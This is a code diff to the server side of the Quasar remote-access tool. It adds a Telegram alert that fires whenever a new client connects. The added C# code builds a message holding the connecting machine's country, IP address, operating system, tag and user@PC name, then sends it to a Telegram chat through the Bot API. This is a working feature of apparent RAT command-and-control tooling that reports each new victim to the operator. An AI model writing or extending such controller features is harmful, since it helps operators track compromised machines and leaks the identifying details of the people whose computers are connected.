@@ -253,6 +253,8 @@ namespace Quasar.Server.Forms
                             AddClientToListview(client.Key);
                             if (Settings.ShowPopup)
                                 ShowPopup(client.Key);
+                            if (Settings.EnableTelegramNotification)
+                                SendTelegramMessage(client.Key);
                             break;
                         case false:
                             RemoveClientFromListview(client.Key);
@@ -446,6 +448,99 @@ namespace Quasar.Server.Forms
             catch (InvalidOperationException)
             {
             }
+        }
+        
+        private void SendTelegramMessage(Client c)
+        {
+            try
+            {
+                if (!String.IsNullOrEmpty(Settings.TelegramBotID) && !String.IsNullOrEmpty(Settings.TelegramChatID) && !String.IsNullOrEmpty(Settings.TelegramMessageFormat))
+                {
+                    string TelegramURL = "https://api.telegram.org/bot" + Settings.TelegramBotID + "/sendMessage?chat_id=" + Settings.TelegramChatID + "&parse_mode=MarkdownV2&text=" + FormatTelegramMessage(c);
+                    GetAsync(TelegramURL);
+                }
+            }
+            catch
+            {
+                
+            }
+        }
+
+        public async Task<string> GetAsync(string uri)
+        {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
+            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
+
+            using (HttpWebResponse response = (HttpWebResponse)await request.GetResponseAsync())
+            using (Stream stream = response.GetResponseStream())
+            using (StreamReader reader = new StreamReader(stream))
+            {
+                return await reader.ReadToEndAsync();
+            }
+        }
+
+        public string FormatTelegramMessage(Client c)
+        {
+            string Message = Base64Decode(Settings.TelegramMessageFormat);
+            string[] MessageLines = Regex.Split(Message, "\r\n|\r|\n");
+
+            int Count = 1;
+            int Max = MessageLines.Length;
+            string TelegramMessage = "";
+            foreach (string Current in MessageLines)
+            {
+                TelegramMessage += Current;
+
+                if (Count != Max)
+                {
+                    TelegramMessage += "%0A";
+                }
+
+
+                Count++;
+            }
+            
+            TelegramMessage = ReplaceString(TelegramMessage, "<country>", c.Value.Country);
+            TelegramMessage = ReplaceString(TelegramMessage, "<ip>", c.EndPoint.Address.ToString());
+            TelegramMessage = ReplaceString(TelegramMessage, "<os>", c.Value.OperatingSystem);
+            TelegramMessage = ReplaceString(TelegramMessage, "<tag>", c.Value.Tag);
+            TelegramMessage = ReplaceString(TelegramMessage, "<username>", c.Value.UserAtPc);
+
+            return EscapeStringTelegram(TelegramMessage);
+        }
+
+        public string ReplaceString(string Content, string search, string replacewith)
+        {
+            string pattern = "(" + search + ")";
+            RegexOptions options = RegexOptions.Multiline;
+
+            Regex regex = new Regex(pattern, options);
+            string result = regex.Replace(Content, replacewith);
+
+            return result;
+        }
+
+        public string EscapeStringTelegram(string Content)
+        {
+            string pattern = @"(_|\*|\[|\]|\(|\)|~|`|>|#|\+|-|=|\||{|}|\.|!)";
+            RegexOptions options = RegexOptions.Multiline;
+
+            Regex regex = new Regex(pattern, options);
+            string result = regex.Replace(Content, "\\$1");
+
+            return result;
+        }
+
+        public static string Base64Encode(string plainText)
+        {
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+            return System.Convert.ToBase64String(plainTextBytes);
+        }
+
+        public static string Base64Decode(string base64EncodedData)
+        {
+            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
+            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
         }
 
         #region "ContextMenuStrip"
